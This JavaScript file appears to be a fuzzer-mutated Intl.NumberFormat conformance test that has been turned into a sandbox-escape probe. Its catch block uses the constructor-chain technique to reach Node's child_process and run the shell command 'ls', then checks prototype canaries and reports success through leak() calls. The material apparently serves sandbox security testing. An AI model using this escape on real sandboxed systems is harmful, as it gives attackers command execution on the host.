try {
    var numbers = [
        0,
        -0,
        1,
        -1,
        5.5,
        123,
        -123,
        -123.45,
        123.44501,
        0.001234,
        -1.23e-9,
        1.23e-30,
        1.2,
        1.2344501e-9,
        123445.01,
        1.2344501e+34,
        -1.2344501e+34,
        Infinity,
        -Infinity,
        NaN
    ];
    var locales = [
        undefined,
        ['de'],
        ['th-u-nu-thai'],
        ['en'],
        ['ja-u-nu-jpanfin'],
        ['ar-u-nu-arab']
    ];
    var options = [
        undefined,
        { style: 'percent' },
        {
            style: 'currency',
            currency: 'EUR',
            currencyDisplay: 'symbol'
        },
        {
            style: 'currency',
            currency: 'IQD',
            currencyDisplay: 'symbol'
        },
        {
            style: 'currency',
            currency: 'KMF',
            currencyDisplay: 'symbol'
        },
        {
            style: 'currency',
            currency: 'CLF',
            currencyDisplay: 'symbol'
        },
        {
            useGrouping: false,
            minimumIntegerDigits: 3,
            minimumFractionDigits: 1,
            maximumFractionDigits: 3
        }
    ];
    locales.forEach(function (locales) {
        let REPLACER = 23;
        options.forEach(function (options) {
            throw () => {
                return () => {
                };
            };
            var formatObj = new Intl.NumberFormat(locales, options);
            var formatFunc = formatObj.format;
            numbers.forEach(function (number) {
                var referenceFormatted = formatObj.format(number);
                var formatted = formatFunc(number);
                assert.sameValue(referenceFormatted, formatted, 'format function produces different result than format method for locales ' + locales + '; options: ' + (options ? JSON.stringify(options) : options) + '.');
            });
        });
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}